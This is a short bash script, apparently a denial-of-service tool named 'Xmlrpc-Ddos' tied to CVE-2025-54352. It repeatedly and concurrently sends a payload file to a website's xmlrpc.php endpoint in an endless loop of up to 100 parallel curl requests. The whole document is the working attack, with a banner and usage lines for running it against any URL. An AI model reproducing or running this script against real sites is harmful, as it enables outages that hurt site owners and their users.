#!/bin/bash
limit=100
###################################################################
################## Author: Nahid ##################################
###################################################################
###################################################################
function banner() {
    local width=56

    echo "+--------------------------------------------------------+"
    printf "|   %-${width}s |\n" "${grey}Xmlrpc-Ddos${default}"
    printf "|   %-${width}s |\n" "${yellow}CVE-2025-54352${default}"
    printf "|   %-${width}s |\n" "${red}Author: Nahid${default}"
    printf "|   %-${width}s |\n" "${red}Link  : https://fumioryoto.github.io${default}"
    printf "|   %-${width}s |\n" "${red}Usage : chmod +x xmlrpcdos.sh${default}"
    printf "|   %-${width}s |\n" "${red}Usage : ./xmlrpcdos.sh <url>${default}"
    echo "+--------------------------------------------------------+"
}


function attack() {
    if [[ $(curl -i -s -k -X POST "${1}/xmlrpc.php" -H "Content-Type: text/xml" --data-binary "@payload.txt") =~ "parse error" ]]; then
        echo "${green}[+] Attacking ${default}${1} ${green}SUCCESS${default}"
    else
        echo "${red}[-] Attacking ${default}${1} ${red}FAILED, maybe down or not vuln.${default}"
    fi
}

if [[ ${#@} != "1" ]]; then
    clear; echo "Usage: $0 <url>"
    exit 0 > /dev/null 2>&1
else
    clear; validation="[a-zA-Z0-9]+\.[a-zA-Z0-9]+.*"
    if [[ $1 =~ $validation ]]; then
        banner; echo ""
        while :
        do
        ((x=x%limit)); ((x++==0)) && wait
            attack $1 &
        done
    else
        echo "Example: (https://xxxxxx.xxx)/(http://xxxxxx.xxx)"; exit 0 > /dev/null 2>&1
    fi
fi
